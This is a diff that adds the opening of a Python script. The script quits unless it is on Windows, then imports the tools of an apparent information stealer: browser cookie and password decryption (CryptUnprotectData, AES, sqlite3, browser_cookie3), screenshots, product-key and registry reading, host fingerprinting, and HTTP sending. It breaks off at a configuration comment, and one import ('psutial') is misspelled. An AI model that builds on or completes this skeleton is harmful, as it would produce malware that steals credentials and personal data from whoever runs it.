@@ -1,0 +1,45 @@
+import os
+if os.name == "nt":
+    pass
+else:
+    exit()
+from json import loads, dumps
+from re import findall
+from urllib.request import Request, urlopen
+from winregistry import WinRegistry as Reg
+from subprocess import Popen, PIPE
+import win32api
+import traceback
+import win32con
+import random
+from PIL import ImageGrab
+import ctypes
+import sys
+import windows_tools.product_key
+import getpass
+import psutil
+import re
+import requests
+import subprocess
+import psutial
+from os import environ, path
+from win32crypt import CryptUnprotectData
+import json
+import base64
+import sqlite3
+import browser_cookie3
+import time
+import logging
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import datetime, timedelta
+from base64 import b64decode
+from platform import system, release, version, machine, processor
+from socket import gethostname, gethostbyname
+from uuid import getnode
+import logging
+import wmi
+from win32com.client import GetObject
+
+# Configuration
